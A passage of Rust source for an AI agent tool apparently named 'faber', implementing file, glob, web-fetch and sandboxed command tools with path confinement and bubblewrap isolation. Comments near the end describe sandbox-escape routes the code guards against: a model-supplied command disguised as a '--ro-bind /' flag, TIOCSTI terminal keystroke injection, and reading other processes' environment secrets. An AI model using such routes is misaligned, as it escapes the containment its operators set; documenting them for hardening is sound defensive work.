    AGENT_ANSI_CODES[agent_color_hash(name) % AGENT_ANSI_CODES.len()]
}

/// Style for framing a tool call's own output: the same muted grey used for
/// reasoning text and other secondary/meta information, so the frame reads
/// as "chrome" rather than model content.
fn tool_box_style() -> Style {
    Style::new().color256(244)
}

/// The opening marker for a tool call's boxed output block.
fn tool_box_open(name: &str, args: &str) -> String {
    tool_box_style()
        .apply_to(format!("── {}({}) ──", name, args))
        .to_string()
}

/// The closing marker for a tool call's boxed output block.
fn tool_box_close(name: &str, duration_secs: f64) -> String {
    tool_box_style()
        .apply_to(format!("── {} done in {:.1}s ──", name, duration_secs))
        .to_string()
}

/// Prefixes each line of a tool's own output with a dim "│ " bar so it
/// reads as visually distinct from surrounding model text, while leaving
/// the line's own content (and any color codes it already carries, e.g.
/// `patch_file`'s diff output) untouched.
fn tool_box_prefix_lines(msg: &str) -> String {
    let bar = tool_box_style().apply_to("│").to_string();
    if msg.is_empty() {
        return bar;
    }
    msg.lines()
        .map(|line| format!("{} {}", bar, line))
        .collect::<Vec<_>>()
        .join("\n")
}

impl ChatPrinter {
    fn new() -> Self {
        Self {
            printer: Arc::new(Mutex::new(None)),
            direct_mode: Arc::new(AtomicBool::new(true)),
        }
    }

    fn set_printer(&self, p: Box<dyn rustyline::ExternalPrinter + Send>) {
        if let Ok(mut guard) = self.printer.lock() {
            *guard = Some(p);
        }
    }

    fn set_direct_mode(&self, direct: bool) {
        self.direct_mode.store(direct, Ordering::Relaxed);
    }

    fn println(&self, msg: &str) {
        if !self.direct_mode.load(Ordering::Relaxed) {
            if let Ok(mut guard) = self.printer.lock() {
                if let Some(ref mut p) = *guard {
                    let _ = p.print(format!("{}\n", msg));
                    return;
                }
            }
        }
        status_bar::write_stderr(&format!("{}\n", msg));
    }

    /// Appends `msg` (no trailing newline) to the current line, so streamed
    /// text is visible the instant it arrives instead of waiting for a full
    /// line to accumulate. Only meaningful in direct mode (while a response
    /// is actively streaming); indirect mode (the idle prompt, for injected
    /// messages) has no concept of an open partial line, so it just falls
    /// back to a complete one.
    fn print_partial(&self, msg: &str) {
        if msg.is_empty() {
            return;
        }
        if !self.direct_mode.load(Ordering::Relaxed) {
            if let Ok(mut guard) = self.printer.lock() {
                if let Some(ref mut p) = *guard {
                    let _ = p.print(msg.to_string());
                    return;
                }
            }
        }
        status_bar::write_partial(msg);
    }

    /// Writes an explicit newline byte from a stream's own output - always,
    /// even to reproduce a deliberate blank line exactly as the stream
    /// wrote it. See `print_partial` for the direct/indirect mode split.
    fn write_newline(&self) {
        if !self.direct_mode.load(Ordering::Relaxed) {
            if let Ok(mut guard) = self.printer.lock() {
                if let Some(ref mut p) = *guard {
                    let _ = p.print("\n".to_string());
                    return;
                }
            }
        }
        status_bar::write_newline();
    }

    /// Closes the current line if (and only if) there's an open partial
    /// line to close - a safe no-op otherwise, so it never prints a
    /// spurious blank line. Indirect mode has no concept of an open
    /// partial line, so it can't tell either way; it does nothing there,
    /// which is the safe default (it's never actually reached during
    /// active streaming, which is the only time this matters).
    fn finish_partial_line(&self) {
        if !self.direct_mode.load(Ordering::Relaxed) {
            return;
        }
        status_bar::finish_partial_line();
    }

    fn println_agent(&self, agent_name: &str, msg: &str) {
        let style = agent_style(agent_name);
        let header = style.apply_to(format!("── {} ──", agent_name));
        self.println(&format!("{}", header));
        for line in msg.lines() {
            self.println(&format!("  {}", line));
        }
        self.println("");
    }
}

const DEFAULT_ENDPOINT: &str = "http://localhost:8080";
const DEFAULT_MODEL: &str = "google/gemini-2.5-pro";

use faber::ToolContext;
use faber::db_backend::DbBackend;
use faber::local_db::LocalDb;

/// Parse parameter strings in NAME=VALUE format into a HashMap
fn parse_parameters(
    param_strings: &[String],
) -> Result<HashMap<String, serde_json::Value>, Box<dyn Error>> {
    let mut parameters = HashMap::new();

    for param in param_strings {
        if let Some((key, value)) = param.split_once('=') {
            let key = key.trim().to_string();
            let value_str = value.trim();

            // Try to parse as different types
            let json_value = if let Ok(num) = value_str.parse::<f64>() {
                if num.is_finite() {
                    serde_json::Value::Number(
                        serde_json::Number::from_f64(num)
                            .unwrap_or_else(|| serde_json::Number::from(0)),
                    )
                } else {
                    serde_json::Value::String(value_str.to_string())
                }
            } else if let Ok(bool_val) = value_str.parse::<bool>() {
                serde_json::Value::Bool(bool_val)
            } else if value_str == "null" {
                serde_json::Value::Null
            } else {
                serde_json::Value::String(value_str.to_string())
            };

            debug!("Parsed parameter: {} = {:?}", key, json_value);
            parameters.insert(key, json_value);
        } else {
            return Err(
                format!("Invalid parameter format: '{}'. Expected NAME=VALUE", param).into(),
            );
        }
    }

    if !parameters.is_empty() {
        debug!(
            "Using {} custom parameters: {:?}",
            parameters.len(),
            parameters
        );
    }

    Ok(parameters)
}

/// Takes `params` out of `tool`'s schema: its properties, and the list of
/// required ones.
fn drop_tool_params(tools: &mut ToolsCollection, tool: &str, params: &[&str]) {
    let Some(item) = tools.get_mut(tool) else {
        return;
    };
    let Ok(mut schema) = serde_json::from_str::<serde_json::Value>(&item.schema) else {
        return;
    };
    let parameters = &mut schema["function"]["parameters"];
    if let Some(properties) = parameters["properties"].as_object_mut() {
        for param in params {
            properties.remove(*param);
        }
    }
    if let Some(required) = parameters["required"].as_array_mut() {
        required.retain(|r| r.as_str().is_none_or(|r| !params.contains(&r)));
    }
    item.schema = schema.to_string();
}

fn append_tool(tools: &mut ToolsCollection, name: String, callback: ToolCallback, schema: String) {
    let item = ToolItem {
        callback: callback,
        schema: schema,
    };
    debug!("Adding tool: {}", name);
    tools.insert(name, item);
}

/// entrypoint for the delete_path tool
fn tool_delete_path(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        path: String,
    }
    let params: Params = serde_json::from_str::<Params>(&params_str)?;
    let params = Params {
        path: ctx.tool_path(&params.path),
        ..params
    };

    debug!("Remove path: {}", params.path);
    check_names_a_file(&params.path)?;
    let root = Root::open(ctx.cwd())?;

    let path = PathBuf::from(&params.path);

    root.remove_all(path)?;
    Ok("deleted".to_owned())
}

/// entrypoint for the read_file tool
/// Above this many lines, a full (non-ranged) read_file result carries a
/// `note` suggesting start_line/end_line instead. Reading a large file in
/// full sends its entire content to the model as a tool result, which can
/// turn the next request into a very large, slow-to-process prompt.
const LARGE_FILE_LINE_WARNING_THRESHOLD: usize = 1000;

/// Tells the model a read stopped at `shown_end` instead of `requested_end`
/// because the rest didn't fit, and how to continue.
fn truncated_read_note(
    start: u64,
    shown_end: u64,
    requested_end: u64,
    total_lines: usize,
) -> String {
    format!(
        "Only lines {}-{} of the requested {}-{} are included (the file has {} lines): \
         the rest is too large for one read. Call read_file again with \
         start_line={} to continue, or search for what you need instead of \
         reading everything.",
        start,
        shown_end,
        start,
        requested_end,
        total_lines,
        shown_end + 1
    )
}

/// How many of `lines` (each with its own newline), starting from the
/// first, fit in `budget_chars` - always at least one, so a single huge line
/// still makes progress (the generic tool-output cap then shortens it).
fn lines_within_budget(lines: &[&str], budget_chars: usize) -> usize {
    let mut used = 0;
    for (i, line) in lines.iter().enumerate() {
        used += line.chars().count();
        if used > budget_chars {
            return i.max(1);
        }
    }
    lines.len()
}

/// Largest file the file tools read whole: past it, grep or run_command
/// can look at parts of it, without faber holding it all in memory.
const MAX_FILE_BYTES: u64 = 64 << 20;

/// Refuses `file` (opened as `path`) if it isn't a regular file - a FIFO
/// would block forever, a device never end - or is over `MAX_FILE_BYTES`.
fn check_readable(file: &std::fs::File, path: &str) -> Result<(), Box<dyn Error>> {
    let meta = file.metadata()?;
    if !meta.is_file() {
        return Err(format!("'{}' isn't a regular file", path).into());
    }
    if meta.len() > MAX_FILE_BYTES {
        return Err(format!(
            "'{}' is {} bytes, too large to read whole (at most {}): use grep, or run_command \
             with head, tail or sed, to look at parts of it",
            path,
            meta.len(),
            MAX_FILE_BYTES
        )
        .into());
    }
    Ok(())
}

/// Refuses a path that names no file - "", "/", "dir/.." - which a tool
/// would otherwise hand on to path resolution as if it did.
fn check_names_a_file(path: &str) -> Result<(), String> {
    if std::path::Path::new(path).file_name().is_none() {
        return Err(format!("'{}' doesn't name a file or directory", path));
    }
    Ok(())
}

/// Opens `path` for reading inside `root` - resolved within it as the file
/// tools resolve paths, symlinks included, so nothing outside it can be
/// reached - and only if it's a regular file: reading a FIFO would block
/// forever (an open can't be interrupted), a device would never end.
pub(crate) fn open_regular_in_root(
    root: &std::path::Path,
    path: &std::path::Path,
) -> Result<std::fs::File, Box<dyn Error>> {
    let file = Root::open(root)?.open_subpath(path, OpenFlags::O_RDONLY | OpenFlags::O_NONBLOCK)?;
    check_readable(&file, &path.display().to_string())?;
    Ok(file)
}

/// `path`'s text, read inside `root` (see `open_regular_in_root`): how
/// faber reads a file a model - or something it controls - names, other
/// than through the file tools themselves.
pub(crate) fn read_text_in_root(
    root: &std::path::Path,
    path: &std::path::Path,
) -> Result<String, Box<dyn Error>> {
    let mut text = String::new();
    open_regular_in_root(root, path)?.read_to_string(&mut text)?;
    Ok(text)
}

fn tool_read_file(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    use serde::Serialize;

    #[derive(Deserialize)]
    struct Params {
        path: String,
        #[serde(default)]
        start_line: Option<u64>,
        #[serde(default)]
        end_line: Option<u64>,
    }

    #[derive(Serialize)]
    struct ReadFileResult {
        content: Option<String>,
        error: Option<String>,
        #[serde(skip_serializing_if = "Option::is_none")]
        total_lines: Option<usize>,
        #[serde(skip_serializing_if = "Option::is_none")]
        start_line: Option<u64>,
        #[serde(skip_serializing_if = "Option::is_none")]
        end_line: Option<u64>,
        #[serde(skip_serializing_if = "Option::is_none")]
        note: Option<String>,
    }

    fn error(message: String) -> ReadFileResult {
        ReadFileResult {
            content: None,
            error: Some(message),
            total_lines: None,
            start_line: None,
            end_line: None,
            note: None,
        }
    }

    let mut params: Params = serde_json::from_str::<Params>(&params_str)?;
    params.path = ctx.tool_path(&params.path);

    debug!("Reading file: {}", params.path);
    // Line 0, from a model counting from 0, is the first.
    params.start_line = params.start_line.map(|start| start.max(1));

    let root = Root::open(ctx.cwd())?;
    let path = PathBuf::from(&params.path);
    let file: Result<std::fs::File, Box<dyn Error>> = root
        .open_subpath(path, OpenFlags::O_RDONLY | OpenFlags::O_NONBLOCK)
        .map_err(Box::from)
        .and_then(|file| check_readable(&file, &params.path).map(|()| file));

    let result = match file {
        Ok(mut file) => {
            let mut contents = String::new();
            match file.read_to_string(&mut contents) {
                Ok(_) => {
                    ctx.note_file_version(&params.path, contents.as_bytes());
                    // Each element keeps its own trailing newline, so joining
                    // a slice of them back together exactly reproduces the
                    // original bytes for that range.
                    let full_lines: Vec<&str> = contents.split_inclusive('\n').collect();
                    let total_lines = full_lines.len();
                    // Leave headroom for JSON escaping (quotes, backslashes
                    // and newlines all grow) and the other fields.
                    let budget = ctx.max_tool_output_chars() * 3 / 4;

                    // Only one end of the range: from there to the end, or
                    // from the start to there.
                    let range = match (params.start_line, params.end_line) {
                        (Some(start), None) => Some((start, total_lines.max(1) as u64)),
                        (None, Some(end)) => Some((1, end)),
                        (Some(start), Some(end)) => Some((start, end)),
                        (None, None) => None,
                    };
                    match range {
                        Some((start, end)) => {
                            if end < start {
                                error(format!(
                                    "end_line ({}) must be >= start_line ({})",
                                    end, start
                                ))
                            } else if start as usize > total_lines {
                                // Past the end - models probe for it: nothing
                                // there, and where it ends, not a failure.
                                ReadFileResult {
                                    content: Some(String::new()),
                                    error: None,
                                    total_lines: Some(total_lines),
                                    start_line: None,
                                    end_line: None,
                                    note: Some(format!(
                                        "The file has {} lines: line {} is past its end.",
                                        total_lines, start
                                    )),
                                }
                            } else {
                                // Past the end: up to the end, said so below.
                                let past_end = end as usize > total_lines;
                                let end = end.min(total_lines as u64);
                                let requested = &full_lines[(start - 1) as usize..end as usize];
                                let shown = lines_within_budget(requested, budget);
                                let shown_end = start + shown as u64 - 1;
                                ReadFileResult {
                                    content: Some(requested[..shown].concat()),
                                    error: None,
                                    total_lines: Some(total_lines),
                                    start_line: Some(start),
                                    end_line: Some(shown_end),
                                    note: if shown < requested.len() {
                                        Some(truncated_read_note(
                                            start,
                                            shown_end,
                                            end,
                                            total_lines,
                                        ))
                                    } else if past_end {
                                        Some(format!(
                                            "The file has only {} lines: shown up to the last.",
                                            total_lines
                                        ))
                                    } else {
                                        None
                                    },
                                }
                            }
                        }
                        None if lines_within_budget(&full_lines, budget) < total_lines => {
                            let shown = lines_within_budget(&full_lines, budget) as u64;
                            ReadFileResult {
                                content: Some(full_lines[..shown as usize].concat()),
                                error: None,
                                total_lines: Some(total_lines),
                                start_line: Some(1),
                                end_line: Some(shown),
                                note: Some(truncated_read_note(
                                    1,
                                    shown,
                                    total_lines as u64,
                                    total_lines,
                                )),
                            }
                        }
                        _ => ReadFileResult {
                            content: Some(contents),
                            error: None,
                            total_lines: Some(total_lines),
                            start_line: None,
                            end_line: None,
                            note: (total_lines > LARGE_FILE_LINE_WARNING_THRESHOLD).then(|| {
                                format!(
                                    "This file has {} lines. If you only need part of it, \
                                     pass start_line/end_line next time to avoid reading \
                                     it all and growing the conversation's context.",
                                    total_lines
                                )
                            }),
                        },
                    }
                }
                Err(e) => error(format!("Failed to read file: {}", describe_error(&e))),
            }
        }
        Err(e) => error(format!(
            "File not found or cannot be opened: {}",
            describe_error(e.as_ref())
        )),
    };

    let json_result = serde_json::to_string(&result)?;
    Ok(json_result)
}

/// Show diff between old and new content using system diff tool with file descriptors
fn show_diff(ctx: &ToolContext, old_content: &str, new_content: &str, file_path: &str) {
    use std::io::Write;
    use std::os::unix::io::{AsRawFd, FromRawFd};
    use std::process::Command;

    // Create temporary files using O_TMPFILE in current directory
    // Use rustix crate for system calls since it's available through pathrs
    let old_fd_result = rustix::fs::openat(
        rustix::fs::CWD,
        ".",
        rustix::fs::OFlags::TMPFILE | rustix::fs::OFlags::RDWR,
        rustix::fs::Mode::RUSR | rustix::fs::Mode::WUSR,
    );

    let new_fd_result = rustix::fs::openat(
        rustix::fs::CWD,
        ".",
        rustix::fs::OFlags::TMPFILE | rustix::fs::OFlags::RDWR,
        rustix::fs::Mode::RUSR | rustix::fs::Mode::WUSR,
    );

    let (old_fd, new_fd) = match (old_fd_result, new_fd_result) {
        (Ok(old), Ok(new)) => (old, new),
        _ => {
            debug!("Failed to create temporary file descriptors");
            return;
        }
    };

    let write_result = (|| -> Result<(), Box<dyn std::error::Error>> {
        use std::io::Seek;
        use std::mem::ManuallyDrop;

        let mut old_file =
            ManuallyDrop::new(unsafe { std::fs::File::from_raw_fd(old_fd.as_raw_fd()) });
        let mut new_file =
            ManuallyDrop::new(unsafe { std::fs::File::from_raw_fd(new_fd.as_raw_fd()) });

        old_file.write_all(old_content.as_bytes())?;
        new_file.write_all(new_content.as_bytes())?;
        old_file.seek(std::io::SeekFrom::Start(0))?;
        new_file.seek(std::io::SeekFrom::Start(0))?;

        Ok(())
    })();

    if let Err(e) = write_result {
        debug!("Failed to write to temporary file descriptors: {}", e);
        return;
    }

    // Run diff command using /proc/self/fd/ paths
    let old_path = format!("/proc/self/fd/{}", old_fd.as_raw_fd());
    let new_path = format!("/proc/self/fd/{}", new_fd.as_raw_fd());

    let diff_result = Command::new("diff")
        .arg("--color=always")
        .arg("-Naur")
        .arg("--label")
        .arg(&format!("a/{}", file_path))
        .arg("--label")
        .arg(&format!("b/{}", file_path))
        .arg(&old_path)
        .arg(&new_path)
        .output();

    // File descriptors will be automatically closed when old_fd and new_fd go out of scope

    match diff_result {
        Ok(output) => {
            // diff returns 0 for no differences, 1 for differences, >1 for errors
            if output.status.code() == Some(0) {
                ctx.println("   No differences detected");
            } else if output.status.code() == Some(1) {
                ctx.println("   Changes:");
                let diff_output = String::from_utf8_lossy(&output.stdout);
                for line in diff_output.lines() {
                    ctx.println(&format!("   {}", line));
                }
            } else {
                debug!("diff command failed with status: {:?}", output.status);
            }
        }
        Err(e) => {
            debug!("Failed to run diff command: {}", e);
        }
    }
}

/// entrypoint for the write_file tool
fn tool_write_file(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    use serde::Serialize;

    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        path: String,
        content: String,
        #[serde(default = "default_file_mode")]
        mode: String,
    }

    #[derive(Serialize)]
    struct WriteFileResult {
        path: String,
        bytes_written: usize,
        mode: String,
        created: bool,
        operation: String,
        message: String,
    }

    fn default_file_mode() -> String {
        "0644".to_string()
    }

    let mut params: Params = serde_json::from_str::<Params>(&params_str).map_err(|e| {
        if e.to_string().contains("unknown field") {
            format!(
                "write_file only writes a whole file (path, content, mode) - {}. \
                 To change part of an existing file, use patch_file.",
                e
            )
        } else {
            e.to_string()
        }
    })?;
    params.path = ctx.tool_path(&params.path);

    debug!(
        "write_file received params: path='{}', content_length={}, mode='{}'",
        params.path,
        params.content.len(),
        params.mode
    );

    let file_mode = if params.mode.starts_with("0o") {
        u32::from_str_radix(&params.mode[2..], 8)
    } else if params.mode.starts_with("0x") {
        u32::from_str_radix(&params.mode[2..], 16)
    } else if params.mode.starts_with("0") && params.mode.len() > 1 {
        u32::from_str_radix(&params.mode[1..], 8)
    } else {
        params.mode.parse::<u32>()
    }
    .map_err(|_| {
        format!(
            "Invalid file mode format: '{}'. Expected octal (0644, 0o644), hex (0x1a4), or decimal",
            params.mode
        )
    })?;

    debug!("Parsed file mode: {} (octal: {:o})", file_mode, file_mode);

    check_names_a_file(&params.path)?;
    let root = Root::open(ctx.cwd())?;
    let path_buf = PathBuf::from(&params.path);

    let existing_content =
        match root.open_subpath(&params.path, OpenFlags::O_RDONLY | OpenFlags::O_NONBLOCK) {
            Ok(mut file) => {
                check_readable(&file, &params.path)?;
                let mut content = Vec::new();
                match file.read_to_end(&mut content) {
                    Ok(_) => Some(content),
                    Err(_) => None,
                }
            }
            Err(_) => None,
        };
    // Only the permission bits: no setuid, setgid or sticky bit, and not
    // writable by every user.
    let file_mode = file_mode & 0o777 & !0o002;
    if let Some(existing) = &existing_content {
        ctx.check_file_unchanged(&params.path, existing)?;
    }

    let (created, mut file) = match root.open_subpath(
        &params.path,
        OpenFlags::O_WRONLY | OpenFlags::O_TRUNC | OpenFlags::O_NONBLOCK,
    ) {
        Ok(file) => {
            check_readable(&file, &params.path)?;
            debug!("File '{}' already exists, will overwrite", params.path);
            use std::os::unix::io::AsRawFd;
            let mode = rustix::fs::Mode::from_raw_mode(file_mode);
            let _ = rustix::fs::fchmod(
                unsafe { rustix::fd::BorrowedFd::borrow_raw(file.as_raw_fd()) },
                mode,
            );
            (false, file)
        }
        Err(e) => {
            debug!("File '{}' does not exist ({}), will create", params.path, e);

            if let Some(parent) = path_buf.parent() {
                if !parent.as_os_str().is_empty() {
                    debug!("Creating parent directories for: {}", parent.display());
                    root.mkdir_all(parent, &Permissions::from_mode(0o755))?;
                    debug!("Parent directories created successfully");
                }
            }

            let permissions = Permissions::from_mode(file_mode);
            debug!("Using file permissions: {:o}", permissions.mode());

            let new_file = root.create_file(
                &params.path,
                OpenFlags::O_WRONLY | OpenFlags::O_CREAT,
                &permissions,
            )?;
            (true, new_file)
        }
    };

    let bytes_written = params.content.len();
    debug!("Writing {} bytes to file: {}", bytes_written, params.path);

    file.write_all(params.content.as_bytes())?;
    ctx.note_file_version(&params.path, params.content.as_bytes());

    let result = WriteFileResult {
        path: params.path.clone(),
        bytes_written,
        mode: format!("{:o}", file_mode),
        created,
        operation: if created {
            "create".to_string()
        } else {
            "overwrite".to_string()
        },
        message: if created {
            format!("File '{}' created successfully", params.path)
        } else {
            format!("File '{}' overwritten successfully", params.path)
        },
    };

    debug!(
        "write_file completed successfully: {} bytes written to '{}' with mode {:o}",
        bytes_written, params.path, file_mode
    );

    ctx.println(&format!("\u{1f4dd} {}", result.message));
    ctx.println(&format!("   Path: {}", result.path));
    ctx.println(&format!("   Bytes written: {}", result.bytes_written));
    ctx.println(&format!("   File mode: {}", result.mode));
    ctx.println(&format!(
        "   Operation: {}",
        if result.created {
            "CREATE"
        } else {
            "OVERWRITE"
        }
    ));

    if !created {
        if let Some(old_content_bytes) = existing_content {
            if std::str::from_utf8(params.content.as_bytes()).is_ok() {
                let old_content = String::from_utf8(old_content_bytes);
                match old_content {
                    Ok(old_content) => {
                        show_diff(ctx, &old_content, &params.content, &params.path);
                    }
                    Err(_) => {}
                }
            }
        }
    }

    let json_result = serde_json::to_string(&result)?;
    Ok(json_result)
}

/// entrypoint for the glob tool
fn tool_glob(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    use serde::Deserialize;

    #[derive(Deserialize)]
    struct Params {
        pattern: String,
    }

    let mut params: Params = serde_json::from_str::<Params>(&params_str)?;
    // An absolute pattern under where it works is taken as relative.
    params.pattern = ctx.tool_path(&params.pattern);
    let glob_pattern = &params.pattern;

    // Security check: reject patterns that try to escape current directory
    if glob_pattern.contains("../") || glob_pattern.starts_with('/') {
        return Err("Pattern cannot access parent directories or absolute paths".into());
    }

    trace!("Executing glob pattern: {}", glob_pattern);

    // Matched under the agent's directory, and listed relative to it.
    let cwd = ctx.cwd();
    let current_dir = cwd.canonicalize().unwrap_or(cwd.clone());
    let base = glob::Pattern::escape(&cwd.to_string_lossy());
    let mut files = Vec::new();
    let mut outside = 0;
    for entry in glob::glob(&format!("{}/{}", base, glob_pattern))? {
        match entry {
            Ok(path) => {
                // Where it really is: a dangling symlink, which can't be
                // resolved itself, is where its directory is - so that a
                // symlink out of the directory doesn't list what's there.
                let real = path
                    .canonicalize()
                    .ok()
                    .or_else(|| Some(path.parent()?.canonicalize().ok()?.join(path.file_name()?)));
                if real.is_some_and(|real| real.starts_with(&current_dir)) {
                    let shown = path.strip_prefix(&cwd).unwrap_or(&path);
                    files.push(shown.to_string_lossy().to_string());
                } else {
                    debug!("Skipping file outside current directory: {:?}", path);
                    // A symlink out (to / say) would have the pattern walk
                    // the whole filesystem for nothing.
                    outside += 1;
                    if outside > 1000 {
                        break;
                    }
                }
            }
            Err(e) => {
                debug!("Error processing glob entry: {}", e);
            }
        }
    }

    files.sort();
    let result = files.join("\n");
    debug!(
        "Successfully matched {} files with pattern '{}'",
        files.len(),
        glob_pattern
    );
    Ok(result)
}

/// entrypoint for the fetch_web_content tool
fn tool_fetch_web_content(
    params_str: &String,
    ctx: &ToolContext,
) -> Result<String, Box<dyn Error>> {
    use serde::Serialize;

    #[derive(Deserialize)]
    struct Params {
        url: String,
        #[serde(default)]
        timeout_seconds: Option<u64>,
        #[serde(default)]
        follow_redirects: Option<bool>,
        #[serde(default)]
        max_content_length: Option<usize>,
    }

    #[derive(Serialize)]
    struct WebContentResult {
        url: String,
        status_code: u16,
        content_type: Option<String>,
        content: String,
        content_length: usize,
        final_url: Option<String>,
        headers: std::collections::HashMap<String, String>,
    }

    let params: Params = serde_json::from_str::<Params>(&params_str)?;

    debug!("Fetching web content from URL: {}", params.url);

    // Validate URL
    if !params.url.starts_with("http://") && !params.url.starts_with("https://") {
        return Err("URL must start with http:// or https://".into());
    }

    let timeout_seconds = params.timeout_seconds.unwrap_or(30);
    let follow_redirects = params.follow_redirects.unwrap_or(true);
    let max_content_length = params.max_content_length.unwrap_or(10_000_000);

    ctx.println(&format!("🌐 Fetching content from: {}", params.url));
    ctx.println(&format!("   Timeout: {}s", timeout_seconds));
    ctx.println(&format!("   Follow redirects: {}", follow_redirects));
    ctx.println(&format!(
        "   Max content length: {} bytes",
        max_content_length
    ));

    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(timeout_seconds))
        .redirect(if follow_redirects {
            reqwest::redirect::Policy::limited(10)
        } else {
            reqwest::redirect::Policy::none()
        })
        .user_agent("faber/0.1.0")
        .build()?;

    let response = client.get(&params.url).send()?;

    let status_code = response.status().as_u16();
    let final_url = if response.url().as_str() != params.url {
        Some(response.url().to_string())
    } else {
        None
    };

    let content_type = response
        .headers()
        .get("content-type")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string());

    // Collect headers
    let mut headers = std::collections::HashMap::new();
    for (key, value) in response.headers() {
        if let Ok(value_str) = value.to_str() {
            headers.insert(key.to_string(), value_str.to_string());
        }
    }

    let content = if response.status().is_success() {
        let content_bytes = response.bytes()?;
        if content_bytes.len() > max_content_length {
            return Err(format!(
                "Content too large: {} bytes (max: {})",
                content_bytes.len(),
                max_content_length
            )
            .into());
        }

        // Try to decode as UTF-8, fallback to lossy conversion
        match std::str::from_utf8(&content_bytes) {
            Ok(text) => text.to_string(),
            Err(_) => String::from_utf8_lossy(&content_bytes).to_string(),
        }
    } else {
        format!("HTTP Error: {}", response.status())
    };

    let content_length = content.len();

    let result = WebContentResult {
        url: params.url.clone(),
        status_code,
        content_type,
        content: content.clone(),
        content_length,
        final_url,
        headers,
    };

    // Display result using context callback
    ctx.println(&format!("📄 Content fetched successfully"));
    ctx.println(&format!("   Status: {}", status_code));
    if let Some(ref ct) = result.content_type {
        ctx.println(&format!("   Content-Type: {}", ct));
    }
    if let Some(ref final_url) = result.final_url {
        ctx.println(&format!("   Final URL: {}", final_url));
    }
    ctx.println(&format!("   Content length: {} bytes", content_length));

    // Show a preview of the content
    let preview_lines: Vec<&str> = content.lines().take(5).collect();
    if !preview_lines.is_empty() {
        ctx.println("   Content preview:");
        for line in preview_lines {
            let truncated = if line.len() > 100 {
                let mut end = 97;
                while end > 0 && !line.is_char_boundary(end) {
                    end -= 1;
                }
                format!("{}...", &line[..end])
            } else {
                line.to_string()
            };
            ctx.println(&format!("     {}", truncated));
        }
        if content.lines().count() > 5 {
            ctx.println("     ... (content truncated in preview)");
        }
    }

    let json_result = serde_json::to_string(&result)?;
    Ok(json_result)
}

#[derive(Deserialize)]
struct RunCommandParams {
    command: String,
    args: Option<Vec<String>>,
}

#[derive(Serialize)]
struct CommandResult {
    stdout: String,
    stderr: String,
    exit_code: Option<i32>,
    success: bool,
}

/// The namespace/capability isolation every bwrap sandbox this app builds
/// shares, independent of whatever filesystem strategy a particular caller
/// layers on top (a fresh empty root with a few binds, for `run_command`;
/// the whole real root read-only, for `--display-graphics`'s LaTeX
/// toolchain - see `latex_kitty::whole_root_ro_bwrap_args`):
///
/// - `--cap-drop ALL`: no Linux capabilities at all.
/// - `--clearenv`, when `clearenv` is true: no inherited environment
///   variables. Some callers need the real environment instead (LaTeX's
///   own file-finding library relies on it), hence this being a parameter
///   rather than always on.
/// - `--unshare-net`: no network access.
/// - `--unshare-pid`: without it the sandboxed process shares the *host's*
///   PID namespace, so it can see every other process via `/proc`
///   (including reading their `/proc/<pid>/environ`, potentially leaking
///   secrets from unrelated processes owned by the same user) and signal
///   any of them. `/proc` (mounted below) then only shows the sandbox's own
///   process tree.
/// - `--unshare-ipc` / `--unshare-uts`: no access to the host's System V/
///   POSIX IPC objects or its hostname.
/// - `--unshare-cgroup-try`: isolates the cgroup namespace when the kernel
///   supports it; `-try` so an older/restricted kernel degrades instead of
///   refusing to run at all (unlike pid/ipc/uts/net, which are old enough
///   to assume are always available).
/// - `--die-with-parent`: the sandboxed process (and anything it spawns) is
///   killed if faber itself dies, instead of potentially lingering,
///   detached, after the tool call that started it is gone.
/// - `--new-session`: detaches from the controlling terminal (`setsid`),
///   closing off `ioctl(fd, TIOCSTI, ...)`-style terminal injection - a
///   sandboxed command could otherwise push fake keystrokes into the same
///   terminal faber's own prompt reads from, effectively escaping into the
///   outer, unsandboxed session without ever touching the filesystem or
///   network restrictions above.
fn bwrap_isolation_flags(clearenv: bool) -> Vec<String> {
    let mut a: Vec<String> = ["--cap-drop", "ALL"]
        .into_iter()
        .map(String::from)
        .collect();
    if clearenv {
        a.push("--clearenv".to_string());
    }
    a.extend(
        [
            "--unshare-net",
            "--unshare-pid",
            "--unshare-ipc",
            "--unshare-uts",
            "--unshare-cgroup-try",
            "--die-with-parent",
            "--new-session",
            "--dev",
            "/dev/",
            "--proc",
            "/proc",
        ]
        .into_iter()
        .map(String::from),
    );
    a
}

/// The trailing `-- <command> [args...]` (or, for a multi-word `command`
/// with no explicit `args`, `-- /usr/bin/bash -c <command>`) shared by
/// every bwrap sandbox this app builds.
///
/// `command`/`args` come straight from the model's tool call and aren't
/// validated to be an actual executable path, so the leading `--` matters:
/// without it, a `command` crafted to look like a bwrap flag (e.g.
/// "--ro-bind" with args ["/", "/", ...]) would be parsed by bwrap as one
/// of *its own* options rather than as the target program - e.g.
/// re-binding the whole host root back over a sandbox's own `--tmpfs /`
/// and defeating its filesystem restriction. `--` tells bwrap unambiguously
/// that everything after it is the command to run, not more of its own
/// arguments.
fn bwrap_command_tail(command: &str, args: Option<&[String]>) -> Vec<String> {
    let mut a = vec!["--".to_string()];
    if args.is_some() || !command.contains(' ') {
        a.push(command.to_string());
        if let Some(args) = args {
            a.extend(args.iter().cloned());
        }
    } else {
        a.push("/usr/bin/bash".to_string());
        a.push("-c".to_string());
        a.push(command.to_string());
    }
    a
}

/// Builds the argument list bwrap needs to sandbox `run_command` when
/// --unsafe-tools isn't set: `bwrap_isolation_flags` (with a cleared
/// environment), plus a fresh empty root with only `/usr`, `/lib` and
/// `/lib64` (read-only, whichever exist) and `cwd` (read-write) visible -
/// so a command can't reach the network or touch anything outside the
/// current directory. Pure and independent of actually spawning bwrap, so
/// it's testable without it installed.
fn bwrap_args(cwd: &str, command: &str, args: Option<&[String]>) -> Vec<String> {
    let mut a = bwrap_isolation_flags(true);
    a.extend(
        [
            "--tmpfs",
            "/",
            "--ro-bind",
            "/usr",
            "/usr",
            // -try for both: which of /lib, /lib64 exist (as real
            // directories or as merged-/usr symlinks into /usr/lib*)
            // varies by architecture and distro - e.g. a non-multilib
            // system may only have one of them, or neither if everything
            // already lives under /usr/lib. Bind whichever are actually
